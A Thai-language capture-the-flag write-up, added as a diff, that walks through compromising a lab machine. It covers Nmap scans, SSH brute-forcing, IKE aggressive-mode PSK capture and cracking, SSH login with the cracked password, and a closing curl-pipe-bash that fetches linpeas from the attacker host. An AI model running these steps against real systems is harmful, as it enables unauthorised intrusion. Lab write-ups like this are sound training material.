@@ -1,0 +1,183 @@
+
+สวัสดีครับ!
+
+เริ่มที่สแกน `Nmap` ก่อนเลย พบว่ามีแค่ Service `ssh` Port `22` ที่เปิดอยู่
+
+```
+$ IP=10.10.11.87
+ports=$(sudo nmap -Pn -sS -p- -T4 ${IP} | grep -E '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//')
+sudo nmap -p${ports} -sC -sV ${IP}
+[...]
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-23 07:36 +07
+Nmap scan report for 10.10.11.87
+Host is up (0.085s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1.88 seconds
+```
+
+ต่อไปสแกน Nmap โดยใช้ `--script ssh-auth-methods` เพื่อตรวจสอบว่าสามารถเข้าสู่ระบบได้ด้วยวิธีอะไรได้บ้าง จะเห็นว่าสามารถใช้ `publickey` หรือ `password` ได้
+
+```
+$ sudo nmap --script ssh-auth-methods -p 22 10.10.11.87 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-23 07:39 +07
+Nmap scan report for 10.10.11.87
+Host is up (0.77s latency).
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+| ssh-auth-methods: 
+|   Supported authentication methods: 
+|     publickey
+|_    password
+
+Nmap done: 1 IP address (1 host up) scanned in 3.39 seconds
+```
+
+Ok ลองเช็ก Version ดู เผื่อมีช่องโหว่ หรือ CVE แต่เหมือนจะไม่มี
+```
+$ searchsploit OpenSSH 10.0p2 Debian 8
+Exploits: No Results
+Shellcodes: No Results
+```
+
+ลอง Brute force `--script ssh-brute` ดูเลยละกัน .. สรุปไม่เจอ
+```
+$ sudo nmap --script ssh-brute -p 22 10.10.11.87
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-23 07:46 +07
+NSE: [ssh-brute] Trying username/password pair: root:root
+NSE: [ssh-brute] Trying username/password pair: admin:admin
+[...]
+Nmap scan report for 10.10.11.87
+Host is up (0.045s latency).
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+| ssh-brute: 
+|   Accounts: No valid accounts found
+|_  Statistics: Performed 124 guesses in 617 seconds, average tps: 0.2
+
+Nmap done: 1 IP address (1 host up) scanned in 617.04 seconds
+```
+
+สแกน `Nmap` เฉพาะ `TCP` ไปแล้ว ลองสแกน `UDP` ดูบ้าง พบว่ามีที่เปิดอยู่แน่ ๆ คือ Service `isakmp` ที่ Port `500`
+```
+$ sudo nmap -sU 10.10.11.87
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-23 08:01 +07
+[...]
+Nmap scan report for 10.10.11.87
+Host is up (0.20s latency).
+Not shown: 967 closed udp ports (port-unreach), 29 filtered udp ports (host-unreach)
+PORT     STATE         SERVICE
+68/udp   open|filtered dhcpc
+69/udp   open|filtered tftp
+500/udp  open          isakmp
+4500/udp open|filtered nat-t-ike
+
+Nmap done: 1 IP address (1 host up) scanned in 1068.84 seconds
+```
+ลองสแกนต่อ
+
+```
+$ sudo nmap -sU -p 500 --script ike-version 10.10.11.87
+[...]
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-23 08:21 +07
+Nmap scan report for 10.10.11.87
+Host is up (0.089s latency).
+
+PORT    STATE SERVICE
+500/udp open  isakmp
+| ike-version: 
+|   attributes: 
+|     XAUTH
+|_    Dead Peer Detection v1.0
+
+Nmap done: 1 IP address (1 host up) scanned in 0.58 seconds
+```
+
+หลังจากนี้ทำตามนี้ละ Ref: https://www.verylazytech.com/network-pentesting/ipsec-ike-vpn-port-500-udp
+
+```
+$ ike-scan -M -A 10.10.11.87
+Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.10.11.87     Aggressive Mode Handshake returned
+        HDR=(CKY-R=f3774d556cb14e1e)
+        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
+        KeyExchange(128 bytes)
+        Nonce(32 bytes)
+        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
+        VID=09002689dfd6b712 (XAUTH)
+        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
+        Hash(20 bytes)
+
+Ending ike-scan 1.9.6: 1 hosts scanned in 0.101 seconds (9.92 hosts/sec).  1 returned handshake; 0 returned notify
+```
+
+
+```
+$ ike-scan -A --pskcrack 10.10.11.87
+Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=602d0c54271aad7b) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)
+
+IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
+8c7d3ba67506fa4255f983cea15bc5c96ab6a4c0b9e59e878447637fd376e3d920daf0400a9aa2382c736e8142a92a640577688b9a1723cacfa92d64511f29eb9d675c09e20f051c34926f2d9a1795af902a9c2a9a069d68d622d515fa8aa45098c3c43968c204fd687542985359eb0132723df231ac380aa3d44d489fb5266c:c0dc8bd6d105c5fd08d6fd7b338a398e818273b2572d99083240383634b931a77f9d5bf75f5648cb9ee70640d9491051d2261909acf353c25e5142803bb90782957fe6a64e7b6aea1f6333931ea08d65cef41fb00a1700a5bea800d4e00e376707f57640aebc94bb13a61ea34dcd1b5c4dc4d77ebb1fcfb5e0295298899666e4:602d0c54271aad7b:eb7a518e0cea6825:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:e5f4fda50afdb3ceb8e1a8a6528114b9d6da5dc4:5446e6a603383f2bd5833dd4cc62caa2b974cf59a02b55a52c2145834068b9c0:5fec442cb346155c9e595c3cd30fb7d761705453
+Ending ike-scan 1.9.6: 1 hosts scanned in 0.169 seconds (5.90 hosts/sec).  1 returned handshake; 0 returned notify
+```
+
+Crack ค่าของ `IKE PSK` parameter ดู..พบว่าเจอค่าที่ hash ด้วย `SHA1` ที่ Match กัน
+
+```
+$ psk-crack --dictionary=/usr/share/seclists/rockyou.txt hashfile.txt
+Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
+Running in dictionary cracking mode
+key "freakingrockstarontheroad" matches SHA1 hash 5fec442cb346155c9e595c3cd30fb7d761705453
+Ending psk-crack: 8045039 iterations in 4.096 seconds (1964021.11 iterations/sec)
+```
+Ok! ได้ Credential มาแล้ว `ike` : `freakingrockstarontheroad` ทดสอบนำไปเข้าสู่ระบบ `ssh` พบว่าสำเร็จ!
+```
+$ ssh ike@10.10.11.87                                                
+ike@10.10.11.87's password: 
+Last login: Mon Sep 22 19:06:20 BST 2025 from 10.10.14.163 on ssh
+Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Mon Sep 22 19:32:34 2025 from 10.10.XX.XXX
+ike@expressway:~$
+```
+จากนั้น `ls` ดู จะพบไฟล์ `user.txt` (user flag)  
+```
+ike@expressway:~$ id
+uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
+ike@expressway:~$ whoami
+ike
+ike@expressway:~$ pwd
+/home/ike
+ike@expressway:~$ ls -lha
+total 32K
+drwx------ 4 ike  ike  4.0K Sep 16 10:23 .
+drwxr-xr-x 3 root root 4.0K Aug 14 22:48 ..
+lrwxrwxrwx 1 root root    9 Aug 29 14:57 .bash_history -> /dev/null
+-rw-r--r-- 1 ike  ike   220 May 18 22:58 .bash_logout
+-rw-r--r-- 1 ike  ike  3.5K Aug 28 12:49 .bashrc
+drwxr-xr-x 3 ike  ike  4.0K Aug 28 12:29 .local
+-rw-r--r-- 1 ike  ike   807 May 18 22:58 .profile
+drwx------ 2 ike  ike  4.0K Sep 16 10:21 .ssh
+-rw-r----- 1 root ike    33 Sep 22 19:05 user.txt
+ike@expressway:~$ cat user.txt
+5785[...]34a4
+```
+ต่อไปหาทางยกระดับสิทธิ์ (Privilege Escalation) เป็น `root`
+
+
+curl http://10.10.XX.XXX/linpeas.sh | bash
+
+
